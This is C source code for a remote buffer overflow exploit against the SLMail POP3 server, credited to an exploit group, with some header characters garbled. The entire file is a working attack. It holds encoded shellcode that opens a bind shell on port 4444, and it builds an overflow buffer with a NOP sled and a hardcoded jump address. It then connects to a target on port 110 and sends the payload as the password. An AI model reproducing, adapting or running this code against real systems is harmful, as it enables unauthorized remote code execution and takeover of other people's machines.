/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov ????-?????
???????????????? 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] =
"\xdb\xcc\xb8\x93\xdc\x24\x8c\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x83\xc3\x04\x03\xd0\xcf\xc6\x79\x2a\x07\x84"
"\x82\xd2\xd8\xe9\x0b\x37\xe9\x29\x6f\x3c\x5a\x9a\xfb\x10\x57"
"\x51\xa9\x80\xec\x17\x66\xa7\x45\x9d\x50\x86\x56\x8e\xa1\x89"
"\xd4\xcd\xf5\x69\xe4\x1d\x08\x68\x21\x43\xe1\x38\xfa\x0f\x54"
"\xac\x8f\x5a\x65\x47\xc3\x4b\xed\xb4\x94\x6a\xdc\x6b\xae\x34"
"\xfe\x8a\x63\x4d\xb7\x94\x60\x68\x01\x2f\x52\x06\x90\xf9\xaa"
"\xe7\x3f\xc4\x02\x1a\x41\x01\xa4\xc5\x34\x7b\xd6\x78\x4f\xb8"
"\xa4\xa6\xda\x5a\x0e\x2c\x7c\x86\xae\xe1\x1b\x4d\xbc\x4e\x6f"
"\x09\xa1\x51\xbc\x22\xdd\xda\x43\xe4\x57\x98\x67\x20\x33\x7a"
"\x09\x71\x99\x2d\x36\x61\x42\x91\x92\xea\x6f\xc6\xae\xb1\xe7"
"\x2b\x83\x49\xf8\x23\x94\x3a\xca\xec\x0e\xd4\x66\x64\x89\x23"
"\x88\x5f\x6d\xbb\x77\x60\x8e\x92\xb3\x34\xde\x8c\x12\x35\xb5"
"\x4c\x9a\xe0\x1a\x1c\x34\x5b\xdb\xcc\xf4\x0b\xb3\x06\xfb\x74"
"\xa3\x29\xd1\x1c\x4e\xd0\xb2\x28\x84\xda\xed\x45\x98\xda\xf0"
"\x2e\x15\x3c\x98\x40\x70\x97\x35\xf8\xd9\x63\xa7\x05\xf4\x0e"
"\xe7\x8e\xfb\xef\xa6\x66\x71\xe3\x5f\x87\xcc\x59\xc9\x98\xfa"
"\xf5\x95\x0b\x61\x05\xd3\x37\x3e\x52\xb4\x86\x37\x36\x28\xb0"
"\xe1\x24\xb1\x24\xc9\xec\x6e\x95\xd4\xed\xe3\xa1\xf2\xfd\x3d"
"\x29\xbf\xa9\x91\x7c\x69\x07\x54\xd7\xdb\xf1\x0e\x84\xb5\x95"
"\xd7\xe6\x05\xe3\xd7\x22\xf0\x0b\x69\x9b\x45\x34\x46\x4b\x42"
"\x4d\xba\xeb\xad\x84\x7e\x1b\xe4\x84\xd7\xb4\xa1\x5d\x6a\xd9"
"\x51\x88\xa9\xe4\xd1\x38\x52\x13\xc9\x49\x57\x5f\x4d\xa2\x25"
"\xf0\x38\xc4\x9a\xf1\x68";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x41, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 8);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
//      *(long*)&evil[2606] = 0x8f354a5f; // JMP ESP XP 7CB41020 FFE4 JMP ESP
      *(long*)&evil[2606] = 0x5f4a358f; 

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
